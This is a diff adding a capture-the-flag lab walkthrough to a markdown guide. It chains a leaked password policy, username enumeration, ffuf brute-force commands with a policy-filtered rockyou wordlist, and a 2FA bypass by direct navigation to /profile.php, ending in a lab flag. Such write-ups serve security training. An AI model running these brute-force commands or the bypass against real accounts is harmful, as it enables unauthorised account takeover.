@@ -937,3 +937,209 @@ This confirms a successful **session hijack via token forgery**.
 ---
 
 ## Exploit - Example
+
+This section demonstrates a complete exploitation chain by combining information disclosure, user enumeration, password brute-forcing, and an authentication bypass via direct access.
+
+Based on the URL structure, the target is clearly a **PHP-based web application**:
+
+```
+http://94.237.63.176:38382/index.php
+```
+
+![Filtered output](images/exploitation.PNG)
+
+The application appears unfinished, as most endpoints are non-functional. However, the login functionality is accessible at:
+
+```
+http://94.237.63.176:38382/login.php
+```
+
+![Filtered output](images/exploitation2.PNG)
+
+Clicking `Register a new account` redirects us to:
+
+```
+http://94.237.63.176:38382/register.php
+```
+
+Attempting to register with weak credentials:
+
+```
+test:test123
+```
+
+reveals the application's password policy:
+
+- Contains at least one digit
+- Contains at least one lower-case character
+- Contains at least one upper-case character
+- Contains NO special characters
+- Is exactly 12 characters long
+
+![Filtered output](images/exploitation3.PNG)
+
+This information leak significantly reduces the password search space and is extremely valuable for brute-forcing.
+
+We register a new user using a password that complies with the policy:
+
+```
+hacker:Hacker123456
+```
+
+The application confirms successful registration:
+
+```
+Success!
+```
+
+![Filtered output](images/exploitation4.PNG)
+
+Logging in with this account results in the following message:
+
+```
+You do not have admin privileges. The site is still under construction and only available to admins at this time.
+```
+
+![Filtered output](images/exploitation5.PNG)
+
+With a valid account, we analyze the login functionality for **differential error messages**.
+
+Attempting to log in with an invalid username:
+
+```
+randomUser:random123
+```
+
+produces:
+
+```
+Unknown username or password.
+```
+
+![Filtered output](images/exploitation6.PNG)
+
+Attempting to log in with a valid username but invalid password:
+
+```
+hacker:invalidPassword123
+```
+
+produces a different message:
+
+```
+Invalid credentials.
+```
+
+![Filtered output](images/exploitation7.PNG)
+
+This behavior allows reliable **username enumeration**.
+
+We insert the `FUZZ` keyword into the intercepted login request and save it to `req.txt`:
+
+![Filtered output](images/exploitation8.PNG)
+
+Using `ffuf`, we brute-force usernames while filtering out invalid responses:
+
+```bash
+ffuf -w xato-net-10-million-usernames.txt:FUZZ -request req.txt -request-proto http -fr "Unknown username or password"
+```
+
+We identify a valid username:
+
+```
+gladys
+```
+
+![Filtered output](images/exploitation9.PNG)
+
+At this point, no password-reset functionality, session manipulation, or parameter abuse is available. Given the leaked password policy, **password brute-forcing** is the most viable attack vector.
+
+We generate a custom wordlist based on the exact password requirements:
+
+```bash
+grep '[[:upper:]]' rockyou.txt | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '^[[:alnum:]]{12}$' > custom_wordlist.txt
+```
+
+This reduces the wordlist from ~14 million entries to approximately 17,000 passwords:
+
+```bash
+wc -l custom_wordlist.txt
+```
+
+![Filtered output](images/exploitation10.PNG)
+
+We replace the `password` parameter with `FUZZ` and save the request:
+
+![Filtered output](images/exploitation11.PNG)
+
+We brute-force the password while filtering on the error message shown for valid usernames:
+
+```bash
+ffuf -w custom_wordlist.txt:FUZZ -request req.txt -request-proto http -fr "Invalid credentials"
+```
+
+A valid password is quickly discovered:
+
+```
+dWinaldasD13
+```
+
+![Filtered output](images/exploitation12.PNG)
+
+Logging in with the compromised credentials:
+
+```
+gladys:dWinaldasD13
+```
+
+triggers a second authentication step:
+
+```
+Please provide your 2FA OTP
+```
+
+![Filtered output](images/exploitation13.PNG)
+
+Submitting a random OTP (`1234`) results in:
+
+```
+Invalid OTP.
+```
+
+![Filtered output](images/exploitation14.PNG)
+
+Brute-forcing OTPs of varying lengths (3–5 digits, padded and unpadded) does not succeed.
+
+Since OTP brute-forcing is ineffective and no other parameters are exposed, we attempt an **authentication bypass via direct access**.
+
+When logging in successfully as the `hacker` user, we are redirected to:
+
+```
+/profile.php
+```
+
+This suggests that a successful 2FA check for `gladys` would result in the same destination.
+
+We log in as `gladys`, intercept the request in **Burp Suite**, and follow the redirect chain until reaching:
+
+```
+/2fa.php
+```
+
+![Filtered output](images/bypass2.PNG)
+
+Before submitting any OTP, we manually modify the request URL:
+
+```
+/profile.php
+```
+
+![Filtered output](images/flag.PNG)
+
+The application fails to enforce the 2FA check server-side and directly serves the protected resource.
+
+The flag is visible in the response:
+
+```
+HTB{d86115e037388d0fa29280b737fd9171}
+```
